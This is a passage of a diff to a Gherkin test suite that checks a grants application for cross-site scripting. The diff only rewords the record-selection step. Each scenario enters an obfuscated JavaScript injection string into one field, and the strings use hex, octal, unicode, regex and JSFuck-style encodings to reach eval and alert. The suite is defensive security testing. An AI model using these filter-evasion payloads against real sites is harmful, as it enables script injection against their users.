       | ';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16155,7 +16155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | ';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16180,7 +16180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | ';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16205,7 +16205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                             | Field                  |
       | ';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAssistanceType__c |
@@ -16230,7 +16230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | ';window['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16255,7 +16255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                  |
       | ';self['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16280,7 +16280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                  |
       | ';this['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16305,7 +16305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | ';top['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16330,7 +16330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | ';parent['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16355,7 +16355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | ';frames['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16380,7 +16380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | ';globalThis['\141\154\145\162\164']('\130\123\123');// | fieldAssistanceType__c |
@@ -16405,7 +16405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                  |
       | ';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16430,7 +16430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                             | Field                  |
       | ';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16455,7 +16455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                             | Field                  |
       | ';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16480,7 +16480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                            | Field                  |
       | ';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16505,7 +16505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                  |
       | ';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16530,7 +16530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                  |
       | ';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16555,7 +16555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                   | Field                  |
       | ';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAssistanceType__c |
@@ -16580,7 +16580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | ';window[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16605,7 +16605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                  |
       | ';self[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16630,7 +16630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                  |
       | ';this[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16655,7 +16655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | ';top[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16680,7 +16680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | ';parent[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16705,7 +16705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                  |
       | ';frames[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16730,7 +16730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | ';globalThis[/al/.source+/ert/.source](/XSS/.source);// | fieldAssistanceType__c |
@@ -16755,7 +16755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                         | Field                  |
       | ';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
@@ -16780,7 +16780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                       | Field                  |
       | ';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
@@ -16805,7 +16805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                       | Field                  |
       | ';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
@@ -16830,7 +16830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                      | Field                  |
       | ';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
@@ -16855,7 +16855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                         | Field                  |
       | ';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
@@ -16880,7 +16880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                         | Field                  |
       | ';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
@@ -16905,7 +16905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                             | Field                  |
       | ';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAssistanceType__c |
